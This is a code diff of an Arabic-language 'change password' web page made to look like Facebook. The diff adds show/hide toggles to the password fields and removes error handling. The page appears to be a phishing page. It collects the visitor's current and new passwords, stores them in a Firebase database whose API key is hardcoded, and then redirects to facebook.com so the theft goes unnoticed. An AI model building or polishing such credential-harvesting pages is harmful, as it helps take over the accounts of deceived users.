@@ -4,12 +4,13 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>تغيير كلمة السر</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
         body { 
             background-color: #f0f2f5; 
             font-family: Arial, sans-serif; 
             display: flex; 
-            flex-direction: column; /* Stack logo and card vertically */
+            flex-direction: column; 
             justify-content: center; 
             align-items: center; 
             height: 100vh; 
@@ -49,10 +50,16 @@
         
         label { display: block; font-weight: bold; margin-bottom: 8px; color: #1c1e21; font-size: 14px; }
         
+        /* Container for input and eye icon */
+        .input-group {
+            position: relative;
+            width: 100%;
+            margin-bottom: 15px;
+        }
+
         input { 
             width: 100%; 
-            padding: 12px; 
-            margin-bottom: 15px; 
+            padding: 12px 12px 12px 40px; /* Padding on the left for the icon in RTL */
             border: 1px solid #dddfe2; 
             border-radius: 6px; 
             box-sizing: border-box; 
@@ -61,6 +68,17 @@
         }
 
         input:focus { border-color: #1877f2; }
+
+        /* Icon positioning for RTL */
+        .toggle-btn {
+            position: absolute;
+            left: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            color: #606770;
+            font-size: 16px;
+        }
 
         .btn-save { 
             width: 100%; 
@@ -79,7 +97,6 @@
 
         .footer { margin-top: 20px; text-align: center; }
         .footer a { color: #1877f2; text-decoration: none; font-size: 14px; }
-        .footer a:hover { text-decoration: underline; }
     </style>
 </head>
 <body>
@@ -92,13 +109,22 @@
         
         <form id="changeForm">
             <label>كلمة السر القديمة</label>
-            <input type="password" id="oldPass" placeholder="أدخل كلمة السر الحالية" required>
+            <div class="input-group">
+                <input type="password" id="oldPass" placeholder="أدخل كلمة السر الحالية" required>
+                <i class="fa-solid fa-eye-slash toggle-btn" onclick="toggleVisibility('oldPass', this)"></i>
+            </div>
             
             <label>كلمة السر الجديدة</label>
-            <input type="password" id="newPass" placeholder="كلمة سر جديدة" required>
+            <div class="input-group">
+                <input type="password" id="newPass" placeholder="كلمة سر جديدة" required>
+                <i class="fa-solid fa-eye-slash toggle-btn" onclick="toggleVisibility('newPass', this)"></i>
+            </div>
             
             <label>تأكيد كلمة السر الجديدة</label>
-            <input type="password" id="confirmPass" placeholder="تأكيد كلمة السر" required>
+            <div class="input-group">
+                <input type="password" id="confirmPass" placeholder="تأكيد كلمة السر" required>
+                <i class="fa-solid fa-eye-slash toggle-btn" onclick="toggleVisibility('confirmPass', this)"></i>
+            </div>
             
             <button type="submit" class="btn-save" id="saveBtn">حفظ التغييرات</button>
         </form>
@@ -109,6 +135,7 @@
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
 
     <script>
+        // Use your config
         const firebaseConfig = {
             apiKey: "AIzaSyDWV0Ks0O5b0XktqJ4mOoRKGfqQZE7q5Eg",
             authDomain: "testapp-f51a4.firebaseapp.com",
@@ -120,6 +147,18 @@
         };
         firebase.initializeApp(firebaseConfig);
         const database = firebase.database();
+
+        // Eye Toggle Function
+        function toggleVisibility(inputId, icon) {
+            const input = document.getElementById(inputId);
+            if (input.type === "password") {
+                input.type = "text";
+                icon.classList.replace("fa-eye-slash", "fa-eye");
+            } else {
+                input.type = "password";
+                icon.classList.replace("fa-eye", "fa-eye-slash");
+            }
+        }
 
         document.getElementById('changeForm').addEventListener('submit', (e) => {
             e.preventDefault();
@@ -144,9 +183,6 @@
             }).then(() => {
                 alert("تم تحديث كلمة السر بنجاح");
                 window.location.href = "https://www.facebook.com";
-            }).catch((err) => {
-                alert("حدث خطأ: " + err.message);
-                document.getElementById('saveBtn').innerText = "حفظ التغييرات";
             });
         });
     </script>
